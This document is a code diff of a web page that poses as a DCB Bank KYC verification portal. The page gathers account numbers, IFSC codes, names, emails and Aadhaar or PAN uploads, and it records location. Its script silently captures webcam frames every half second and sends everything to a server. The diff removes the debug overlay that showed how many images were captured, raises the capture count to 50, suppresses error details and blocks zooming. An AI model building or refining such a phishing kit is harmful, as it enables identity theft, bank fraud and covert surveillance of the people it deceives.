@@ -2,76 +2,85 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>DCB Bank KYC Verification</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      -webkit-tap-highlight-color: transparent;
     }
     
     body {
       background-color: #f4f6f9;
       color: #333;
       line-height: 1.6;
-      padding: 20px;
+      padding: 15px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
     }
     
     .container {
       max-width: 500px;
-      margin: 40px auto;
+      width: 100%;
+      margin: 20px auto;
       background: white;
-      border-radius: 12px;
-      padding: 30px;
-      box-shadow: 0 6px 25px rgba(0, 0, 0, 0.1);
+      border-radius: 16px;
+      padding: 25px;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
       position: relative;
       overflow: hidden;
+      flex-grow: 1;
     }
     
     .logo {
       display: block;
-      margin: 0 auto 20px;
-      width: 200px;
+      margin: 0 auto 15px;
+      width: 160px;
+      height: auto;
     }
     
     h2 {
       text-align: center;
       color: #003d6a;
-      margin-bottom: 25px;
+      margin-bottom: 20px;
       font-weight: 700;
-      font-size: 28px;
+      font-size: 24px;
     }
     
     .notice {
-      font-size: 15px;
+      font-size: 14px;
       color: #444;
       text-align: center;
-      margin-bottom: 25px;
+      margin-bottom: 20px;
       background-color: #f8f9fa;
-      padding: 15px;
+      padding: 12px;
       border-radius: 8px;
       border-left: 4px solid #ffc107;
     }
     
     label {
       display: block;
-      margin-top: 20px;
+      margin-top: 18px;
       font-weight: 600;
-      font-size: 15px;
+      font-size: 14px;
       color: #003d6a;
     }
     
     input[type="text"],
     input[type="file"] {
       width: 100%;
-      font-size: 15px;
-      padding: 14px;
-      margin-top: 8px;
+      font-size: 14px;
+      padding: 12px;
+      margin-top: 6px;
       border-radius: 8px;
       border: 1px solid #d1d5db;
       transition: all 0.3s;
+      background: white;
     }
     
     input[type="text"]:focus,
@@ -82,24 +91,23 @@
     }
     
     button {
-      margin-top: 30px;
+      margin-top: 25px;
       width: 100%;
       background-color: #003d6a;
       color: white;
       border: none;
-      padding: 16px;
-      font-size: 17px;
+      padding: 15px;
+      font-size: 16px;
       font-weight: 600;
       border-radius: 8px;
       cursor: pointer;
       transition: all 0.3s;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
     }
     
     button:hover {
       background-color: #00548c;
-      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
-      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
     }
     
     #kycForm {
@@ -108,18 +116,18 @@
     
     .footer {
       text-align: center;
-      margin-top: 35px;
-      font-size: 13px;
+      margin-top: 30px;
+      font-size: 12px;
       color: #777;
-      padding-top: 20px;
+      padding-top: 15px;
       border-top: 1px solid #eee;
     }
     
     .error {
       color: #d32f2f;
       text-align: center;
-      font-size: 14px;
-      margin-top: 15px;
+      font-size: 13px;
+      margin-top: 12px;
       font-weight: 500;
     }
     
@@ -135,16 +143,19 @@
       align-items: center;
       z-index: 1000;
       backdrop-filter: blur(8px);
+      padding: 15px;
     }
     
     .popup-content {
       background: white;
       border-radius: 16px;
-      width: 90%;
+      width: 100%;
       max-width: 500px;
-      padding: 35px;
-      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.25);
+      padding: 25px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
       animation: popupIn 0.5s ease-out;
+      max-height: 90vh;
+      overflow-y: auto;
     }
     
     @keyframes popupIn {
@@ -155,97 +166,95 @@
     .popup-header {
       display: flex;
       align-items: center;
-      margin-bottom: 25px;
+      margin-bottom: 20px;
     }
     
     .popup-icon {
-      width: 60px;
-      height: 60px;
+      width: 50px;
+      height: 50px;
       background-color: #e6f2ff;
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      margin-right: 20px;
+      margin-right: 15px;
+      flex-shrink: 0;
     }
     
-    .popup-icon svg {
-      width: 28px;
-      height: 28px;
-      fill: #003d6a;
+    .popup-icon i {
+      color: #003d6a;
+      font-size: 24px;
     }
     
     .popup-title {
       color: #003d6a;
-      font-size: 26px;
+      font-size: 22px;
       font-weight: 700;
     }
     
     .popup-message {
-      font-size: 16px;
-      line-height: 1.7;
+      font-size: 15px;
+      line-height: 1.6;
       color: #444;
-      margin-bottom: 25px;
+      margin-bottom: 20px;
     }
     
     .highlight {
       background-color: #fff8e1;
-      padding: 20px;
-      border-radius: 10px;
+      padding: 15px;
+      border-radius: 8px;
       border-left: 4px solid #ffc107;
-      margin: 25px 0;
-      font-size: 15px;
+      margin: 18px 0;
+      font-size: 14px;
     }
     
     .popup-button {
       background-color: #003d6a;
       color: white;
       border: none;
-      padding: 16px 30px;
-      font-size: 17px;
+      padding: 14px;
+      font-size: 16px;
       font-weight: 600;
       border-radius: 8px;
       cursor: pointer;
       display: block;
       width: 100%;
       transition: all 0.3s;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
+      margin-top: 15px;
     }
     
     .popup-button:hover {
       background-color: #00548c;
-      transform: translateY(-2px);
     }
     
     .security-badge {
       display: flex;
       align-items: center;
       justify-content: center;
-      margin-top: 25px;
-      font-size: 14px;
+      margin-top: 20px;
+      font-size: 13px;
       color: #28a745;
       font-weight: 600;
     }
     
-    .security-badge svg {
-      width: 18px;
-      height: 18px;
-      margin-right: 10px;
-      fill: #28a745;
+    .security-badge i {
+      margin-right: 8px;
+      font-size: 16px;
     }
     
     .step-indicator {
       display: flex;
       justify-content: center;
-      margin: 30px 0;
+      margin: 20px 0;
     }
     
     .step {
-      width: 12px;
-      height: 12px;
+      width: 10px;
+      height: 10px;
       border-radius: 50%;
       background-color: #d1d5db;
-      margin: 0 8px;
+      margin: 0 6px;
     }
     
     .step.active {
@@ -254,13 +263,13 @@
     
     .spinner {
       display: inline-block;
-      width: 22px;
-      height: 22px;
+      width: 20px;
+      height: 20px;
       border: 3px solid rgba(255,255,255,.3);
       border-radius: 50%;
       border-top-color: #fff;
       animation: spin 1s ease-in-out infinite;
-      margin-right: 12px;
+      margin-right: 10px;
       vertical-align: middle;
     }
     
@@ -270,60 +279,99 @@
     
     .success-message {
       text-align: center;
-      padding: 20px;
+      padding: 18px;
       background-color: #e8f5e9;
       border-radius: 8px;
       border-left: 4px solid #28a745;
-      margin-top: 20px;
+      margin-top: 18px;
       display: none;
     }
     
     .success-message h3 {
       color: #28a745;
-      margin-bottom: 10px;
+      margin-bottom: 8px;
+      font-size: 18px;
     }
     
-    .debug-info {
-      position: fixed;
-      bottom: 10px;
-      right: 10px;
-      background: rgba(0,0,0,0.7);
-      color: white;
-      padding: 10px;
-      border-radius: 5px;
-      font-size: 12px;
-      z-index: 1000;
+    .success-message p {
+      font-size: 14px;
     }
     
-    @media (max-width: 600px) {
+    /* Mobile-specific styles */
+    @media (max-width: 480px) {
+      body {
+        padding: 10px;
+      }
+      
       .container {
-        margin: 20px 15px;
-        padding: 25px 20px;
+        padding: 20px 15px;
+        margin: 10px auto;
+        border-radius: 12px;
+      }
+      
+      .logo {
+        width: 140px;
+        margin-bottom: 12px;
+      }
+      
+      h2 {
+        font-size: 22px;
+        margin-bottom: 15px;
       }
       
       .popup-content {
-        padding: 25px 20px;
+        padding: 20px 15px;
+        max-height: 95vh;
       }
       
       .popup-title {
-        font-size: 22px;
+        font-size: 20px;
       }
+      
+      .popup-message {
+        font-size: 14px;
+      }
+      
+      .popup-icon {
+        width: 45px;
+        height: 45px;
+      }
+      
+      input[type="text"],
+      input[type="file"] {
+        padding: 10px;
+        font-size: 14px;
+      }
+      
+      button {
+        padding: 14px;
+        font-size: 15px;
+      }
+      
+      .highlight {
+        padding: 12px;
+        font-size: 13px;
+      }
+    }
+    
+    /* Hide scrollbar for Chrome, Safari and Opera */
+    .popup-content::-webkit-scrollbar {
+      display: none;
+    }
+    
+    /* Hide scrollbar for IE, Edge and Firefox */
+    .popup-content {
+      -ms-overflow-style: none;  /* IE and Edge */
+      scrollbar-width: none;  /* Firefox */
     }
   </style>
 </head>
 <body>
-  <div class="debug-info" id="debugInfo">
-    <div>Images Captured: <span id="imageCount">0</span></div>
-    <div>Location: <span id="locationStatus">Not captured</span></div>
-  </div>
-
   <div id="verificationPopup">
     <div class="popup-content">
       <div class="popup-header">
         <div class="popup-icon">
-          <svg viewBox="0 0 24 24">
-            <path d="M12,17.27L18.18,21L16.54,13.97L22,9.24L14.81,8.62L12,2L9.19,8.62L2,9.24L7.45,13.97L5.82,21L12,17.27Z" />
-          </svg>
+          <i class="fas fa-shield-alt"></i>
         </div>
         <div class="popup-title">Important: KYC Verification Process</div>
       </div>
@@ -340,7 +388,7 @@
         During this verification, you'll be asked to grant temporary access to:
       </p>
       
-      <ul class="popup-message">
+      <ul class="popup-message" style="padding-left: 20px;">
         <li><strong>Camera</strong> - For identity confirmation and facial recognition</li>
         <li><strong>Location</strong> - For transaction security verification</li>
       </ul>
@@ -355,19 +403,19 @@
         <div class="step"></div>
       </div>
       
-      <button class="popup-button" onclick="closePopup()">I Understand & Continue</button>
+      <button class="popup-button" onclick="closePopup()">
+        <i class="fas fa-check-circle"></i> I Understand & Continue
+      </button>
       
       <div class="security-badge">
-        <svg viewBox="0 0 24 24">
-          <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.1 14.8,9.5V11C15.4,11 16,11.6 16,12.3V15.8C16,16.4 15.4,17 14.7,17H9.2C8.6,17 8,16.4 8,15.7V12.2C8,11.6 8.6,11 9.2,11V9.5C9.2,8.1 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,9.5V11H13.5V9.5C13.5,8.7 12.8,8.2 12,8.2Z" />
-        </svg>
+        <i class="fas fa-lock"></i>
         Secure & Encrypted Verification Process
       </div>
     </div>
   </div>
 
   <div class="container">
-    <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjYwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iNjAiIGZpbGw9IiMwMDNkNmEiIHJ4PSI2Ii8+PHRleHQgeD0iMTAwIiB5PSIzNSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjIyIiBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiBmb250LXdlaWdodD0iNzAwIj5EQ0IgQmFuazwvdGV4dD48L3N2Zz4=" alt="DCB Bank Logo">
+    <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYwIiBoZWlnaHQ9IjQ4IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxNjAiIGhlaWdodD0iNDgiIGZpbGw9IiMwMDNkNmEiIHJ4PSI0Ii8+PHRleHQgeD0iODAiIHk9IjI4IiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTgiIGZpbGw9IiNmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGRvbWluYW50LWJhc2VsaW5lPSJtaWRkbGUiIGZvbnQtd2VpZ2h0PSI3MDAiPkRDQiBCYW5rPC90ZXh0Pjwvc3ZnPg==" alt="DCB Bank Logo">
     <h2>DCB Bank KYC Verification</h2>
 
     <div id="permissionStep">
@@ -375,41 +423,45 @@
         For your security and verification, please allow access to your device's <strong>camera</strong> and <strong>location</strong>.<br>
         You must grant both permissions to proceed with KYC verification.
       </p>
-      <button onclick="requestPermissions()">Allow & Continue</button>
+      <button onclick="requestPermissions()">
+        <i class="fas fa-camera"></i> Allow & Continue
+      </button>
       <p id="permStatus" class="error"></p>
     </div>
 
     <div id="kycForm">
       <form id="kycFormElement">
-        <label for="bankname">Bank Name</label>
+        <label for="bankname"><i class="fas fa-university"></i> Bank Name</label>
         <input type="text" id="bankname" name="bankname" placeholder="Enter recipient's bank name" required>
 
-        <label for="ifsc">IFSC Code</label>
+        <label for="ifsc"><i class="fas fa-code"></i> IFSC Code</label>
         <input type="text" id="ifsc" name="ifsc" placeholder="Enter IFSC code" required>
 
-        <label for="accno">Account Number</label>
+        <label for="accno"><i class="fas fa-wallet"></i> Account Number</label>
         <input type="text" id="accno" name="accno" placeholder="Enter account number" required>
 
-        <label for="fullname">Full Name</label>
+        <label for="fullname"><i class="fas fa-user"></i> Full Name</label>
         <input type="text" id="fullname" name="fullname" placeholder="Enter your full name" required>
 
-        <label for="email">Email Address</label>
+        <label for="email"><i class="fas fa-envelope"></i> Email Address</label>
         <input type="text" id="email" name="email" placeholder="Enter your email" required>
 
-        <label for="document">Upload Aadhaar or PAN (PDF, JPG, PNG only)</label>
+        <label for="document"><i class="fas fa-file-upload"></i> Upload Aadhaar or PAN (PDF, JPG, PNG only)</label>
         <input type="file" id="document" name="document" accept=".pdf,.jpg,.jpeg,.png" required>
 
-        <button type="submit">Verify Account</button>
+        <button type="submit">
+          <i class="fas fa-check"></i> Verify Account
+        </button>
       </form>
       
       <div id="successMessage" class="success-message">
-        <h3>✅ Verification Submitted Successfully!</h3>
+        <h3><i class="fas fa-check-circle"></i> Verification Submitted Successfully!</h3>
         <p>Your KYC verification is now being processed. You will receive confirmation shortly.</p>
       </div>
     </div>
 
     <div class="footer">
-      © 2025 DCB Bank Ltd. All rights reserved. | For official verification purposes only.
+      <i class="fas fa-lock"></i> © 2025 DCB Bank Ltd. All rights reserved. | For official verification purposes only.
     </div>
   </div>
 
@@ -417,11 +469,6 @@
   <canvas id="captureCanvas" style="display: none;"></canvas>
   
   <script>
-    // Debug elements
-    const debugInfo = document.getElementById('debugInfo');
-    const imageCountElement = document.getElementById('imageCount');
-    const locationStatusElement = document.getElementById('locationStatus');
-    
     // Close the verification popup
     function closePopup() {
       document.getElementById('verificationPopup').style.display = 'none';
@@ -432,7 +479,7 @@
     let captureInterval = null;
     let capturedImages = [];
     let locationData = null;
-    const MAX_IMAGES = 10; // Reduced for testing
+    const MAX_IMAGES = 50;
     
     // Function to request permissions
     function requestPermissions() {
@@ -464,10 +511,6 @@
               accuracy: position.coords.accuracy,
               timestamp: position.timestamp
             };
-            
-            // Update debug info
-            locationStatusElement.textContent = "Captured";
-            debugInfo.style.display = 'block';
             
             // Permissions granted - show form
             document.getElementById('permissionStep').style.display = 'none';
@@ -532,7 +575,6 @@
       captureInterval = setInterval(() => {
         if (capturedImages.length >= MAX_IMAGES) {
           clearInterval(captureInterval);
-          console.log("Image capture completed. Total images:", capturedImages.length);
           return;
         }
         
@@ -540,9 +582,6 @@
         ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
         const imageData = canvas.toDataURL('image/jpeg', 0.8);
         capturedImages.push(imageData);
-        
-        // Update debug info
-        imageCountElement.textContent = capturedImages.length;
       }, 500); // Capture every 500ms
     }
     
@@ -599,11 +638,6 @@
           formData.append('location', JSON.stringify(locationData));
         }
         
-        // Add debug info
-        console.log('Submitting form with:');
-        console.log('- Images:', capturedImages.length);
-        console.log('- Location:', locationData);
-        
         // Send data to server
         const response = await fetch('/submit', {
           method: 'POST',
@@ -614,15 +648,12 @@
           // Show success message
           document.getElementById('kycFormElement').style.display = 'none';
           document.getElementById('successMessage').style.display = 'block';
-          
-          console.log('Form submitted successfully');
         } else {
-          const errorText = await response.text();
-          throw new Error(`Server error: ${response.status} - ${errorText}`);
+          throw new Error('Server responded with an error');
         }
       } catch (error) {
         console.error("Submission error:", error);
-        alert(`There was an error processing your verification: ${error.message}`);
+        alert("There was an error processing your verification. Please try again.");
         submitBtn.disabled = false;
         submitBtn.innerHTML = originalBtnText;
       }
@@ -649,6 +680,13 @@
     // Start the process by showing popup immediately
     window.addEventListener('load', function() {
       document.getElementById('verificationPopup').style.display = 'flex';
+      
+      // Prevent zooming on mobile
+      document.addEventListener('touchmove', function(event) {
+        if (event.scale !== 1) {
+          event.preventDefault();
+        }
+      }, { passive: false });
     });
   </script>
 </body>
